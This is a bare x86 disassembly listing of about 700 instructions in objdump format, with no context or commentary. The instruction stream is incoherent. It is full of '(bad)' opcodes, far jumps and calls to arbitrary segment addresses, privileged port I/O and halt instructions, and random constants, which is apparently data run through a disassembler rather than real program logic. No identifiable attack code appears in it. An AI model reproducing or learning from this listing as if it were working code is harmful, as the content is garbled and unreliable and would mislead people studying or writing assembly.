  40c35b:	mov    BYTE PTR [edx],bl
  40c35d:	mov    BYTE PTR gs:[ebx+0x283fe72a],bl
  40c364:	fmulp  st(4),st
  40c366:	lds    esi,FWORD PTR [edx-0x35bbb35e]
  40c36c:	arpl   WORD PTR [ecx+0x29ace66e],si
  40c372:	mov    ecx,0xfcce827b
  40c377:	sbb    al,0xd3
  40c379:	jno    0x40c3b6
  40c37b:	mov    edx,0xf9bddd10
  40c380:	mov    ecx,DWORD PTR [edi]
  40c382:	es xchg ebp,eax
  40c384:	js     0x40c3b1
  40c386:	outs   dx,DWORD PTR ds:[esi]
  40c387:	fnstenv [esi]
  40c389:	push   ss
  40c38a:	sub    eax,esp
  40c38c:	inc    esp
  40c38d:	std    
  40c38e:	fistp  QWORD PTR [eax]
  40c390:	mov    DWORD PTR [edi+0x263d1a40],edi
  40c396:	dec    ebp
  40c397:	xchg   ecx,eax
  40c398:	or     BYTE PTR [edx],bl
  40c39a:	call   0x978a:0xae63b273
  40c3a1:	lock jne 0x40c3ee
  40c3a4:	and    edx,eax
  40c3a6:	xor    BYTE PTR [ecx+0x9af552b],dh
  40c3ac:	js     0x40c385
  40c3ae:	add    al,0x4c
  40c3b0:	inc    ecx
  40c3b1:	adc    BYTE PTR [edi],0x92
  40c3b4:	jbe    0x40c350
  40c3b6:	xchg   BYTE PTR [ebp-0x60],ch
  40c3b9:	sbb    esp,DWORD PTR [edi]
  40c3bb:	cli    
  40c3bc:	sahf   
  40c3bd:	loopne 0x40c345
  40c3bf:	inc    edi
  40c3c0:	mov    ecx,0x352f73af
  40c3c5:	jge    0x40c38e
  40c3c7:	push   esp
  40c3c8:	mov    ds:0x9fb397ad,al
  40c3cd:	inc    DWORD PTR [ebp-0x44bc7858]
  40c3d3:	pushf  
  40c3d4:	punpckhdq mm2,QWORD PTR [eax]
  40c3d7:	or     eax,0x93a15027
  40c3dc:	jmp    0x393f:0x210bf421
  40c3e3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c3e4:	pop    eax
  40c3e5:	xor    BYTE PTR [ebx-0x31],dh
  40c3e8:	xchg   BYTE PTR [eax+0x17433d78],al
  40c3ee:	inc    edx
  40c3ef:	sub    edx,eax
  40c3f1:	xor    al,0x67
  40c3f3:	sub    al,BYTE PTR [ebp-0x1e2891aa]
  40c3f9:	jae    0x40c479
  40c3fb:	sbb    al,BYTE PTR fs:[ecx+ecx*4+0x54984b80]
  40c403:	pop    ebx
  40c404:	jns    0x40c3b6
  40c406:	add    bh,BYTE PTR [ebx-0x1970c2d1]
  40c40c:	fs clc 
  40c40e:	gs jnp 0x40c3c7
  40c411:	lods   eax,DWORD PTR ds:[esi]
  40c412:	add    bl,dl
  40c414:	repz cmp bl,BYTE PTR [edx+0x1cebf552]
  40c41b:	fstp   DWORD PTR [eax-0x42]
  40c41e:	rcr    DWORD PTR [edi+0x5426fcda],cl
  40c424:	cmp    BYTE PTR [ebp+0x3b],bl
  40c427:	pop    es
  40c428:	xlat   BYTE PTR ds:[ebx]
  40c429:	retf   0x3ba9
  40c42c:	rcl    BYTE PTR [eax-0x2b],0xf4
  40c430:	push   edi
  40c431:	mov    ds:0xddee3cf1,al
  40c436:	jns    0x40c48c
  40c438:	lods   al,BYTE PTR ds:[esi]
  40c439:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c43a:	int3   
  40c43b:	adc    ch,BYTE PTR [esi-0x61bcf90b]
  40c441:	mov    dl,0x87
  40c443:	push   ebp
  40c444:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c445:	xor    BYTE PTR [ebx-0x1f],0xdf
  40c449:	fisttp DWORD PTR [eax-0x21]
  40c44c:	lods   al,BYTE PTR ds:[esi]
  40c44d:	bound  ebp,QWORD PTR [ecx+0x5a418d4d]
  40c453:	adc    cl,BYTE PTR [ebx]
  40c455:	cwde   
  40c456:	aas    
  40c457:	ja     0x40c470
  40c459:	add    al,0xb9
  40c45b:	outs   dx,BYTE PTR ds:[esi]
  40c45c:	inc    esi
  40c45d:	pop    ecx
  40c45e:	jnp    0x40c409
  40c460:	enter  0xa260,0x94
  40c464:	add    DWORD PTR [ecx+0x23a495c3],ebx
  40c46a:	(bad)  
  40c46b:	mov    dl,BYTE PTR [esi+eax*8]
  40c46e:	jne    0x40c49a
  40c470:	mov    eax,0x6d2cab1
  40c475:	jecxz  0x40c411
  40c477:	pusha  
  40c478:	js     0x40c44a
  40c47a:	pop    es
  40c47b:	sar    DWORD PTR [edx],1
  40c47d:	in     eax,dx
  40c47e:	(bad)  
  40c47f:	adc    bl,cl
  40c481:	test   al,0xfb
  40c483:	icebp  
  40c484:	(bad)  
  40c485:	ins    DWORD PTR es:[edi],dx
  40c486:	imul   eax,DWORD PTR [ecx-0x14c36568],0xffffffe5
  40c48d:	xor    BYTE PTR [edx],dl
  40c48f:	mov    edi,?
  40c491:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c492:	test   BYTE PTR [esi+0x17170942],bh
  40c498:	imul   si,WORD PTR [edi-0x5c],0xbcf8
  40c49e:	sub    eax,DWORD PTR [ebp+ebp*4+0x22]
  40c4a2:	sub    al,ah
  40c4a4:	mov    gs,WORD PTR [ecx-0x76b84609]
  40c4aa:	enter  0xf0cd,0xd6
  40c4ae:	rcr    DWORD PTR [edx+0x1f],0x67
  40c4b2:	mov    DWORD PTR [ebx],edi
  40c4b4:	out    0x89,eax
  40c4b6:	bnd jo 0x40c4ae
  40c4b9:	sub    ebp,DWORD PTR [esi-0x7f50f290]
  40c4bf:	mov    al,0xec
  40c4c1:	data16 aaa 
  40c4c3:	or     ah,dl
  40c4c5:	enter  0x32a0,0xa9
  40c4c9:	dec    esi
  40c4ca:	imul   esi,DWORD PTR [ebx+0x6a],0xffffffa1
  40c4ce:	add    BYTE PTR [esi+esi*1+0x7d],bh
  40c4d2:	pop    ss
  40c4d3:	das    
  40c4d4:	xchg   ebp,eax
  40c4d5:	mov    eax,0xc1fdc62e
  40c4da:	inc    esi
  40c4db:	hlt    
  40c4dc:	pop    esi
  40c4dd:	or     ch,bh
  40c4df:	jns    0x40c48e
  40c4e1:	inc    eax
  40c4e2:	dec    edi
  40c4e3:	call   0x3c9fd9ec
  40c4e8:	cmp    al,0xe9
  40c4ea:	scas   eax,DWORD PTR es:[edi]
  40c4eb:	(bad)  
  40c4ed:	xchg   ebx,eax
  40c4ee:	fdivr  st(3),st
  40c4f0:	mov    ds:0x620fb8a7,eax
  40c4f5:	push   esp
  40c4f6:	and    al,0x66
  40c4f8:	dec    ebx
  40c4f9:	xchg   esi,eax
  40c4fa:	test   DWORD PTR [edi],esi
  40c4fc:	mov    esi,0x51c0a974
  40c501:	(bad)  
  40c502:	lahf   
  40c503:	mov    edi,0x868e0d3b
  40c508:	test   eax,0x9b66292a
  40c50d:	addr16 sub eax,0xd1b7cb50
  40c513:	lock mov ch,al
  40c516:	jmp    0x9b33177b
  40c51b:	mov    esp,0xf09a157f
  40c520:	inc    edi
  40c521:	xor    eax,0x41708459
  40c526:	imul   ebp,DWORD PTR [ebp-0x64],0x11
  40c52a:	add    edi,DWORD PTR [ebp+0x61]
  40c52d:	jp     0x40c4ff
  40c52f:	jge    0x40c4c4
  40c531:	cwde   
  40c532:	shl    DWORD PTR [esi],1
  40c534:	xchg   ecx,eax
  40c535:	rol    BYTE PTR [eax-0x3037cd96],cl
  40c53b:	mov    bl,0x75
  40c53d:	sub    ah,BYTE PTR [eax]
  40c53f:	sti    
  40c540:	ss jo  0x40c509
  40c543:	pop    edi
  40c544:	sbb    DWORD PTR ds:0x63f57bbd,ebp
  40c54a:	scas   al,BYTE PTR es:[edi]
  40c54b:	(bad)
  40c54e:	cs sub al,0x24
  40c551:	lods   eax,DWORD PTR ds:[esi]
  40c552:	xor    DWORD PTR [edi],0xe359fe25
  40c558:	(bad)  
  40c559:	ins    BYTE PTR es:[edi],dx
  40c55a:	and    eax,0xffffff9f
  40c55d:	les    edi,FWORD PTR [eax]
  40c55f:	and    ebx,DWORD PTR [edx+0x60738c21]
  40c565:	(bad)  
  40c566:	mov    ds:0x7ba77a94,eax
  40c56b:	xchg   ebp,eax
  40c56c:	(bad)  [edx+ecx*1]
  40c56f:	sbb    BYTE PTR ds:0x37ad07be,dh
  40c575:	mov    dh,0x26
  40c577:	mov    dl,0x6
  40c579:	mov    dl,BYTE PTR [edx+edx*2-0x493aaea7]
  40c580:	mov    ecx,0x33c8d5c6
  40c585:	ror    DWORD PTR [esp+ecx*1+0x6287869c],cl
  40c58c:	cmp    DWORD PTR [ecx-0x45c98771],edx
  40c592:	shl    DWORD PTR [edi+esi*2],cl
  40c595:	jae    0x40c553
  40c597:	int    0xf
  40c599:	push   eax
  40c59a:	fist   DWORD PTR [eax-0x14]
  40c59d:	dec    edx
  40c59e:	or     DWORD PTR [ecx-0x34],eax
  40c5a1:	mov    dh,0xd0
  40c5a3:	and    eax,DWORD PTR [ecx-0x26]
  40c5a6:	sub    al,0x7b
  40c5a8:	jl     0x40c5f1
  40c5aa:	sub    eax,0xe1e5d6b3
  40c5af:	adc    al,0x54
  40c5b1:	jge    0x40c5ae
  40c5b3:	jl     0x40c5a6
  40c5b5:	push   ebp
  40c5b6:	aas    
  40c5b7:	pop    esp
  40c5b8:	imul   esi,DWORD PTR ds:0x12fdf7eb,0x3e12456c
  40c5c2:	xchg   BYTE PTR [edx+eiz*1+0x4c],ah
  40c5c6:	and    DWORD PTR [ebp+ebx*1+0x1b],edx
  40c5ca:	dec    eax
  40c5cb:	inc    edi
  40c5cc:	jo     0x40c54f
  40c5ce:	jp     0x40c592
  40c5d0:	adc    eax,0x68819bed
  40c5d5:	jns    0x40c5a9
  40c5d7:	jg     0x40c640
  40c5d9:	xor    DWORD PTR ds:0xa42451f6,esp
  40c5df:	cwde   
  40c5e0:	cmp    cl,BYTE PTR [edx+0x10]
  40c5e3:	leave  
  40c5e4:	mov    eax,0xba4e916f
  40c5e9:	or     eax,0x2a98cf23
  40c5ee:	ret    
  40c5ef:	(bad)  
  40c5f0:	mov    dh,0x23
  40c5f2:	imul   ecx,DWORD PTR [eax+esi*4+0x15e8cf10],0xaae4ae6a
  40c5fd:	mov    edi,0xc582926
  40c602:	jmp    0x40c658
  40c604:	inc    eax
  40c605:	cld    
  40c606:	xchg   DWORD PTR [esi+0x61],edi
  40c609:	inc    esp
  40c60a:	jno    0x40c59e
  40c60c:	xchg   esp,eax
  40c60d:	jl     0x40c626
  40c60f:	and    DWORD PTR [ecx],edi
  40c611:	(bad)  
  40c612:	and    ch,BYTE PTR [edx]
  40c614:	or     ch,BYTE PTR [edx+0x1a54facc]
  40c61a:	dec    eax
  40c61b:	pop    ebx
  40c61c:	push   es
  40c61d:	xor    esi,DWORD PTR ds:0xd7960db4
  40c623:	mov    ebx,0x911a9bfd
  40c628:	pop    esp
  40c629:	retf   
  40c62a:	mov    bh,0x4d
  40c62c:	pop    eax
  40c62d:	push   0x10b75630
  40c632:	repnz cli 
  40c634:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c635:	pop    edx
  40c636:	cs adc edx,edi
  40c639:	mov    ah,0x9
  40c63b:	mov    ds:0xa799de93,eax
  40c640:	repz xchg esi,eax
  40c642:	jmp    0x351aef66
  40c647:	push   0x42cf8f01
  40c64c:	cld    
  40c64d:	dec    esp
  40c64e:	cmp    al,0x75
  40c650:	loope  0x40c629
  40c652:	mov    esi,0xe3fac49b
  40c657:	stos   DWORD PTR es:[edi],eax
  40c658:	xor    eax,0x77052c25
  40c65d:	ins    BYTE PTR es:[edi],dx
  40c65e:	mov    eax,ds:0x684518f3
  40c663:	scas   al,BYTE PTR es:[edi]
  40c664:	mov    cl,0xe5
  40c666:	xchg   edi,eax
  40c667:	push   ss
  40c668:	xchg   esp,eax
  40c669:	repnz aas 
  40c66b:	jo     0x40c66c
  40c66d:	xchg   ecx,eax
  40c66e:	sbb    ch,bh
  40c670:	and    eax,DWORD PTR [ebx+0x36]
  40c673:	(bad)
  40c678:	push   0x18afa302
  40c67d:	fisttp DWORD PTR [ebx+0x68]
  40c680:	call   0x7a15:0x3e2f73cf
  40c687:	fisttp QWORD PTR [ebp+ebx*1-0x6fa5bba2]
  40c68e:	mov    gs,WORD PTR [edx+edx*4-0x1e]
  40c692:	mov    eax,0x8e76898d
  40c697:	mov    esi,0xf58d12a
  40c69c:	sbb    eax,0x9203d04d
  40c6a1:	push   ss
  40c6a2:	ds sub al,0x2d
  40c6a5:	mov    es,WORD PTR [edx]
  40c6a7:	push   esi
  40c6a8:	rcl    bl,0x19
  40c6ab:	mov    esp,0x5218d3b5
  40c6b0:	test   BYTE PTR [edx+0x2e823355],al
  40c6b6:	and    eax,0x143c32de
  40c6bb:	sbb    esi,DWORD PTR [eax]
  40c6bd:	mov    al,ds:0x5609c78f
  40c6c2:	sub    al,0xc5
  40c6c4:	sti    
  40c6c5:	fcos   
  40c6c7:	lea    esi,[ebp-0x34]
  40c6ca:	xchg   ebp,eax
  40c6cb:	jp     0x40c684
  40c6cd:	das    
  40c6ce:	pop    es
  40c6cf:	(bad)  
  40c6d0:	stc    
  40c6d1:	dec    edx
  40c6d2:	and    BYTE PTR [esi+0x58cd5785],0x2d
  40c6d9:	fcom   QWORD PTR [edi-0x3609857f]
  40c6df:	xchg   cl,cl
  40c6e1:	inc    ecx
  40c6e2:	imul   eax,DWORD PTR [esi-0x162f1f51],0x287300b6
  40c6ec:	xchg   edx,eax
  40c6ed:	fnsave [esi+0x6e2ee69a]
  40c6f3:	aad    0x4b
  40c6f5:	xchg   edx,eax
  40c6f6:	add    ah,BYTE PTR [edx+0xf]
  40c6f9:	loop   0x40c685
  40c6fb:	retf   0x8dc5
  40c6fe:	and    eax,0xcba8342f
  40c703:	cmp    esi,DWORD PTR [eax+0xc1a9ff9]
  40c709:	pop    ecx
  40c70a:	scas   eax,DWORD PTR es:[edi]
  40c70b:	cmp    eax,ebx
  40c70d:	jmp    0x40c749
  40c70f:	aas    
  40c710:	je     0x40c71b
  40c712:	xchg   ebx,eax
  40c713:	add    ebx,DWORD PTR [eax+0x61]
  40c716:	(bad)  
  40c718:	fcomp  DWORD PTR [ecx]
  40c71a:	dec    ecx
  40c71b:	sar    edi,0x14
  40c71e:	xchg   ebp,eax
  40c71f:	outs   dx,DWORD PTR ds:[esi]
  40c720:	imul   ecx,DWORD PTR [edx-0x6a8f6685],0x179784b
  40c72a:	xchg   ecx,eax
  40c72b:	jle    0x40c7ab
  40c72d:	mov    ah,0x90
  40c72f:	nop
  40c730:	jo     0x40c6ea
  40c732:	test   DWORD PTR [edi],edx
  40c734:	sahf   
  40c735:	cdq    
  40c736:	js     0x40c708
  40c738:	es (bad) 
  40c73a:	xlat   BYTE PTR ds:[ebx]
  40c73b:	cmp    DWORD PTR [esi+0x7241c692],0xffffffb4
  40c742:	test   DWORD PTR [edi+edi*4-0x49],esp
  40c746:	mov    cl,0x20
  40c748:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c749:	out    0x52,eax
  40c74b:	mov    BYTE PTR [ecx+0x5d],bl
  40c74e:	push   esi
  40c74f:	jmp    0x40c7a0
  40c751:	mov    edx,0x6d804231
  40c756:	ja     0x40c765
  40c758:	(bad)  
  40c759:	mul    BYTE PTR [edx]
  40c75b:	push   eax
  40c75c:	popf   
  40c75d:	cmc    
  40c75e:	adc    esp,ebx
  40c760:	mov    eax,0xee2832c8
  40c765:	dec    ecx
  40c766:	imul   edi,DWORD PTR [ebp+0x6e76e61b],0xdd3c6fa9
  40c770:	and    BYTE PTR [edx-0x58aaf704],cl
  40c776:	seta   BYTE PTR [edx]
  40c779:	ja     0x40c7f1
  40c77b:	adc    al,ah
  40c77d:	cmp    ebp,esp
  40c77f:	mov    bl,0xf4
  40c781:	int    0xb6
  40c783:	je     0x40c753
  40c785:	shr    DWORD PTR [ecx],0xc9
  40c788:	fistp  QWORD PTR [esi-0x1c457cc5]
  40c78e:	(bad)
  40c792:	loop   0x40c7b5
  40c794:	mov    ch,0x79
  40c796:	inc    esp
  40c797:	push   edi
  40c798:	sub    edx,DWORD PTR [esi+0x3d]
  40c79b:	adc    dh,ch
  40c79d:	jle    0x40c746
  40c79f:	mov    ah,BYTE PTR [ecx-0xcf29a3a]
  40c7a5:	out    dx,eax
  40c7a6:	sub    BYTE PTR [ebx-0x39],bh
  40c7a9:	push   edi
  40c7aa:	dec    esi
  40c7ab:	or     ecx,eax
  40c7ad:	xor    esi,eax
  40c7af:	jno    0x40c79b
  40c7b1:	xchg   ecx,eax
  40c7b2:	(bad)  
  40c7b4:	cmp    al,0x54
  40c7b6:	mov    dh,BYTE PTR [edx+ebx*1-0x3c8f89a2]
  40c7bd:	scas   al,BYTE PTR es:[edi]
  40c7be:	test   BYTE PTR [edi],cl
  40c7c0:	push   ss
  40c7c1:	dec    edx
  40c7c2:	and    eax,0xa5c3f405
  40c7c7:	inc    eax
  40c7c8:	mov    eax,0xd66f6db5
  40c7cd:	inc    esp
  40c7ce:	sub    edx,ecx
  40c7d0:	and    esp,DWORD PTR [bx+si-0x4563]
  40c7d5:	sbb    DWORD PTR [ebx-0x716a665e],ebx
  40c7db:	inc    edi
  40c7dc:	faddp  st(5),st
  40c7de:	pop    esi
  40c7df:	fild   WORD PTR [esi]
  40c7e1:	nop
  40c7e2:	xor    DWORD PTR [esp+ebp*4],0xffffffaa
  40c7e6:	fst    st(4)
  40c7e8:	aad    0x14
  40c7ea:	sub    BYTE PTR ds:0x12b294d7,bh
  40c7f0:	inc    edi
  40c7f1:	mov    ebp,0x8718f34e
  40c7f6:	fbld   TBYTE PTR [ecx-0x2dadfe4f]
  40c7fc:	add    WORD PTR [ebx+0x7d9dcfba],si
  40c803:	ins    BYTE PTR es:[edi],dx
  40c804:	test   DWORD PTR [esi],0xf2675177
  40c80a:	cmp    eax,0xd6ccf97d
  40c80f:	sub    BYTE PTR [esi+0x53ba7dc4],dh
  40c815:	inc    ebx
  40c816:	pushf  
  40c817:	jno    0x40c817
  40c819:	jne    0x40c7a2
  40c81b:	js     0x40c87e
  40c81d:	sub    DWORD PTR [edi],eax
  40c81f:	(bad)  [ecx]
  40c821:	stos   DWORD PTR es:[edi],eax
  40c822:	fwait
  40c823:	mov    eax,ds:0x92780c7c
  40c828:	cmp    BYTE PTR [edx-0x5],ah
  40c82b:	inc    BYTE PTR [ecx+ecx*4]
  40c82e:	sbb    ebx,DWORD PTR [edx+ecx*1-0x53]
  40c832:	and    ah,BYTE PTR [ecx]
  40c834:	and    eax,0x36467e4f
  40c839:	mov    ds:0xa99b81c3,eax
  40c83e:	fwait
  40c83f:	xchg   edi,eax
  40c840:	push   ebx
  40c841:	mov    ch,0xc4
  40c843:	fbld   TBYTE PTR [edx]
  40c845:	fstp   QWORD PTR [edi+eax*4]
  40c848:	sub    BYTE PTR [eax-0x47023122],dh
  40c84e:	add    eax,0xb2ec50fb
  40c853:	xor    eax,DWORD PTR [ecx+0x3f559ae5]
  40c859:	xor    dl,BYTE PTR [esi]
  40c85b:	std    
  40c85c:	loope  0x40c834
  40c85e:	push   ss
  40c85f:	pop    ds
  40c860:	les    edx,FWORD PTR [esi-0x393b3878]
  40c866:	inc    esp
  40c867:	adc    dh,dl
  40c869:	cmp    cl,0xb1
  40c86c:	jl     0x40c8d1
  40c86e:	test   DWORD PTR [ebx-0x63],ebx
  40c871:	push   eax
  40c872:	xchg   ebx,eax
  40c873:	jb     0x40c8ca
  40c875:	popf   
  40c876:	adc    ebx,DWORD PTR [ebp+0x73e71228]
  40c87c:	sub    eax,0x178e3248
  40c881:	fsubr  st,st(5)
  40c883:	pushf  
  40c884:	mov    ds:0x8b322e0,eax
  40c889:	jmp    0x40c8ee
  40c88b:	xchg   esp,eax
  40c88c:	jno    0x40c864
  40c88e:	test   DWORD PTR [ebp-0x7e504a0],eax
  40c894:	imul   esp,DWORD PTR [ebx+0x1c],0x6919f0ba
  40c89b:	mov    WORD PTR [ecx+eax*2-0x3f],ds
  40c89f:	dec    edx
  40c8a0:	fdivp  st(1),st
  40c8a2:	jb     0x40c878
  40c8a4:	rol    BYTE PTR [ebx+ebp*2],cl
  40c8a7:	add    ecx,edx
  40c8a9:	cmc    
  40c8aa:	sub    cl,BYTE PTR [eax+0x67d1901f]
  40c8b0:	adc    eax,0x5e286e34
  40c8b5:	in     al,dx
  40c8b6:	out    0x44,eax
  40c8b8:	jl     0x40c8b9
  40c8ba:	icebp  
  40c8bb:	in     eax,0x8d
  40c8bd:	outs   dx,BYTE PTR ds:[esi]
  40c8be:	or     DWORD PTR [esi+0x7],eax
  40c8c1:	xor    bl,ch
  40c8c3:	xlat   BYTE PTR ds:[ebx]
  40c8c4:	jg     0x40c84a
  40c8c6:	stos   BYTE PTR es:[edi],al
  40c8c7:	sti    
  40c8c8:	inc    ebp
  40c8c9:	add    ah,BYTE PTR [ebx+0x27]
  40c8cc:	dec    ecx
  40c8cd:	mov    ds:0xbc9875a3,eax
  40c8d2:	cmp    al,0x2f
  40c8d4:	frstor [edi-0x78997d0e]
  40c8da:	sbb    DWORD PTR [edx],edx
  40c8dc:	jmp    0x84cd:0x67cf4b97
  40c8e3:	stc    
  40c8e4:	or     eax,0xdac56e5b
  40c8e9:	je     0x40c961
  40c8eb:	mov    eax,ds:0xbf8e6a75
  40c8f0:	test   cl,0x15
  40c8f3:	push   ds
  40c8f4:	dec    ecx
  40c8f5:	xchg   edx,eax
  40c8f6:	xchg   ebp,eax
  40c8f7:	cld    
  40c8f8:	hlt    
  40c8f9:	(bad)  
  40c8fa:	bound  edi,QWORD PTR [edi-0x59ba20a9]
  40c900:	push   cs
  40c901:	rcl    BYTE PTR [edx+0x66faab45],1
  40c907:	mov    esi,0xae0289e1
  40c90c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c90d:	mov    ds:0x17f75bf2,eax
  40c912:	dec    eax
  40c913:	fcomp  QWORD PTR [ebp-0x6e]
  40c916:	dec    edi
  40c917:	jbe    0x40c8ec
  40c919:	aad    0x5a
  40c91b:	mov    ah,0xe2
  40c91d:	xchg   ebp,eax
  40c91e:	lds    eax,FWORD PTR [edx]
  40c920:	paddsb mm6,QWORD PTR ds:0x795f2ef4
  40c927:	add    edx,ebp
  40c929:	xor    DWORD PTR [esi],edx
  40c92b:	cdq    
  40c92c:	test   BYTE PTR [edi+0xa],dh
  40c92f:	out    0xfa,eax
  40c931:	jmp    0xb2bb:0xfe38c7ef
  40c938:	adc    esi,DWORD PTR [edx+0x77]
  40c93b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c93c:	out    dx,al
  40c93d:	jmp    0x40c93f
  40c93f:	xchg   ecx,eax
  40c940:	mov    WORD PTR [esi+0x3b38a0c8],?
  40c946:	add    eax,0xa8d9c28
  40c94b:	xchg   esp,eax
  40c94c:	scas   al,BYTE PTR es:[edi]
  40c94d:	mov    edi,edx
  40c94f:	adc    DWORD PTR [edi-0x5e],ecx
  40c952:	dec    ebp
  40c953:	in     eax,dx
  40c954:	fadd   st,st(5)
  40c956:	aaa    
  40c957:	shl    BYTE PTR [ebp-0x52],0x10
  40c95b:	ds hlt 
  40c95d:	push   ss
  40c95e:	inc    eax
  40c95f:	xor    ch,dl
  40c961:	(bad)  
  40c963:	je     0x40c972
  40c965:	cli    
  40c966:	mov    esi,0x19da4919
  40c96b:	adc    eax,0x53a1a5b1
  40c970:	(bad)  
  40c972:	imul   edi,esi,0x41
  40c975:	shl    BYTE PTR [edi],0x22
  40c978:	fs dec ebx
  40c97a:	icebp  
  40c97b:	fwait
  40c97c:	daa    
  40c97d:	lods   eax,DWORD PTR ds:[esi]
  40c97e:	push   es
  40c97f:	cmp    DWORD PTR [edi+0x4da7eefd],esp
  40c985:	popa   
  40c986:	mov    bl,0xf4
  40c988:	cdq    
  40c989:	adc    al,0x36
  40c98b:	push   ebp
  40c98c:	loop   0x40c9d9
  40c98e:	cmc    
  40c98f:	repnz sub eax,0xf7eb7e6
  40c995:	adc    DWORD PTR [ebx],edi
  40c997:	xchg   ebp,eax
  40c998:	pop    ebp
  40c999:	push   ebx
  40c99a:	aaa    
  40c99b:	push   eax
  40c99c:	rcl    DWORD PTR [edx+0x1df32245],0x50
  40c9a3:	fdivr  QWORD PTR [ebx+0x5c]
  40c9a6:	inc    edx
  40c9a7:	mov    ds:0xd59d943f,eax
  40c9ac:	mov    al,0xc
  40c9ae:	pop    edi
  40c9af:	adc    ebp,edi
  40c9b1:	mov    dh,0xff
  40c9b3:	aas    
  40c9b4:	test   BYTE PTR [ecx],ch
  40c9b6:	pop    esi
  40c9b7:	adc    edi,DWORD PTR [ecx+0x550fb220]
  40c9bd:	adc    ah,0xdd
  40c9c0:	xchg   esp,eax
  40c9c1:	clc    
  40c9c2:	cmp    esi,DWORD PTR [ebx+0x75]
  40c9c5:	add    al,0x54
  40c9c7:	sbb    DWORD PTR [ecx+0x34],esi
  40c9ca:	fstp   QWORD PTR [ebx]
  40c9cc:	mov    cl,0xc6
  40c9ce:	rcl    DWORD PTR [esi-0xf06ee67],0xb3
  40c9d5:	loop   0x40c9d9
  40c9d7:	mov    esi,DWORD PTR [edx-0x64]
  40c9da:	(bad)  
  40c9db:	jge    0x40ca11
  40c9dd:	jne    0x40c988
  40c9df:	cmp    BYTE PTR [edi+ebp*1],ch
  40c9e2:	xchg   ecx,eax
  40c9e3:	jmp    0x1a8:0x6db5ea
  40c9ea:	pusha  
  40c9eb:	or     BYTE PTR [ecx+0x72],bh
  40c9ee:	cmp    ebp,DWORD PTR [ebx-0x43e464f8]
  40c9f4:	inc    edx
  40c9f5:	ja     0x40c9b4
  40c9f7:	adc    al,0xc5
  40c9f9:	je     0x40c9b0
  40c9fb:	fnstsw WORD PTR [ecx-0x503a3e96]
  40ca01:	sub    al,0xf7
  40ca03:	or     BYTE PTR [esi-0x41e90473],ch
  40ca09:	pop    eax
  40ca0a:	lods   eax,DWORD PTR ds:[esi]
  40ca0b:	and    ebx,DWORD PTR [eax]
  40ca0d:	xchg   BYTE PTR [edi+0x2f],dh
  40ca10:	mov    eax,0xa3eca0bc
  40ca15:	adc    ebp,DWORD PTR [edx+eiz*2-0x1126dbd5]
  40ca1c:	ficomp WORD PTR [eax+0x31131f45]
  40ca22:	arpl   WORD PTR [edi+ecx*8-0x28],dx
  40ca26:	(bad)  
  40ca27:	iret   
  40ca28:	je     0x40c9ff
  40ca2a:	pop    ebp
  40ca2b:	and    eax,edi
  40ca2d:	mov    cl,0x19
  40ca2f:	test   al,0x12
  40ca31:	addr16 push es
  40ca33:	xor    bh,BYTE PTR [eax-0x2b84a9bc]
  40ca39:	aaa    
  40ca3a:	push   es
  40ca3b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ca3c:	es stos DWORD PTR es:[edi],eax
  40ca3e:	jns    0x40ca9c
  40ca40:	sti    
  40ca41:	mov    al,ds:0x32d725f6
  40ca46:	adc    esp,DWORD PTR [ebp+0x1e]
  40ca49:	fucomip st,st(6)
  40ca4b:	aad    0xa7
  40ca4d:	fild   DWORD PTR [ebx+0x15]
  40ca50:	es leave 
  40ca52:	mov    dl,0x4a
  40ca54:	add    al,0xe
  40ca56:	mov    al,0xa6
  40ca58:	test   BYTE PTR [edi-0x5e91a3dc],al
  40ca5e:	inc    bx
  40ca60:	loope  0x40caa2
  40ca62:	addr16 aam 0x65
  40ca65:	stc    
  40ca66:	cmp    BYTE PTR [edx],0x9a
  40ca69:	popa   
  40ca6a:	jnp    0x40ca58
  40ca6c:	out    dx,eax
  40ca6d:	addr16 aad 0x32
  40ca70:	in     eax,dx
  40ca71:	out    dx,al
  40ca72:	inc    esp
  40ca73:	addr16 jne 0x40cadd
  40ca76:	dec    eax
  40ca77:	(bad)  
  40ca78:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ca79:	retf   
  40ca7a:	push   edi
  40ca7c:	stos   BYTE PTR es:[edi],al
  40ca7d:	daa    
  40ca7e:	xchg   esp,eax
  40ca7f:	shl    DWORD PTR [ebx+0xf],0xf0
  40ca83:	(bad)  
  40ca84:	xchg   ebx,eax
  40ca85:	xchg   DWORD PTR [ebp+0xb],ebx
  40ca88:	aas    
  40ca89:	sub    DWORD PTR [eax+0x55],0xede1d10f
  40ca90:	ja     0x40caea
  40ca92:	pusha  
  40ca93:	nop
  40ca94:	mov    edx,DWORD PTR [edi-0x21d9d425]
  40ca9a:	add    al,0x72
  40ca9c:	xor    BYTE PTR [edx-0x303e07b4],0x95
  40caa3:	mov    DWORD PTR [esi-0x1d108b4b],esi
  40caa9:	rol    DWORD PTR [edx+0x67],cl
  40caac:	xchg   esi,eax
  40caad:	push   ss
  40caae:	xor    eax,0x2baaf29f
  40cab3:	cmc    
  40cab4:	or     esi,ecx
  40cab6:	jns    0x40ca82
  40cab8:	mov    ch,0x1d
  40caba:	xchg   DWORD PTR [edi],esi
  40cabc:	test   al,cl
  40cabe:	sbb    bh,cl
  40cac0:	(bad)  
  40cac1:	nop
  40cac2:	int3   
  40cac3:	std    
  40cac4:	cmp    edi,DWORD PTR [esi]
  40cac6:	add    dh,dh
  40cac8:	sbb    DWORD PTR [ebx+edi*1+0x4e1eab4b],edx
  40cacf:	add    DWORD PTR [ecx-0x59],ebp
  40cad2:	pop    ds
  40cad3:	jmp    0x40cb01
  40cad5:	mov    BYTE PTR [ecx-0x5],0x25
  40cad9:	pusha  
  40cada:	ror    DWORD PTR [ebp+0x6a],0xf1
  40cade:	jmp    0x7d05:0x3c1eab9
  40cae5:	dec    esi
  40cae6:	dec    eax
  40cae7:	cmp    bh,BYTE PTR [eax-0x4c]
  40caea:	push   ds
  40caeb:	push   ds
  40caec:	das    
